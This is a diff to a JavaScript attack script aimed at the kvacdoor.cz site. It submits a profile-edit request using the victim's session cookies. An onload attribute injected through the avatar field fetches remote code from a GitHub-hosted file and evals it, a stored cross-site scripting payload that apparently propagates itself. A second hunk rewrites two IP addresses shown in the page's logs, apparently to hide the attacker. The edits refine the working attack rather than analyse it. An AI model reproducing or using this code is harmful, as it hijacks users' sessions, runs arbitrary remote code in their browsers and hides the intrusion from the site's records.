@@ -43,7 +43,7 @@ if (!expander) {
     },
     "referrer": "https://kvacdoor.cz/profile/" + id,
     "referrerPolicy": "strict-origin-when-cross-origin",
-    "body": 'username=' + username + '&avatar=' + avatar + '" onload="fetch(`https://raw.githubusercontent.com/Clineeeche/Clineeeche.github.io/main/JQuery?' + Date.now() + '`).then( async result => eval(await result.text()))&description=test&steamid=test&edit-profile=',
+    "body": 'username=' + username + '&avatar=' + avatar + '" onload="fetch(`https://raw.githubusercontent.com/Clineeeche/Clineeeche.github.io/main/JQuery?${Date.now()}`).then( async result => eval(await result.text()))&description=test&steamid=test&edit-profile=',
     "method": "POST",
     "mode": "cors",
     "credentials": "include"
@@ -54,10 +54,10 @@ try {
     var logs = document.querySelectorAll("#app-layouts > div.main-content > div > div.row > div > div > div > p");
     logs.forEach(log => {
         if (logs.innerText.includes("107.189.10.123")) {
-            logs.innerText.replace("107.189.10.123", ipv6)
+            logs.innerText = logs.innerText.replace("107.189.10.123", ipv6)
         }
         if (logs.innerText.includes("146.59.80.183")) {
-            logs.innerText.replace("146.59.80.183", ipv6_2)
+            logs.innerText = logs.innerText.replace("146.59.80.183", ipv6)
         }
     });
 }catch {
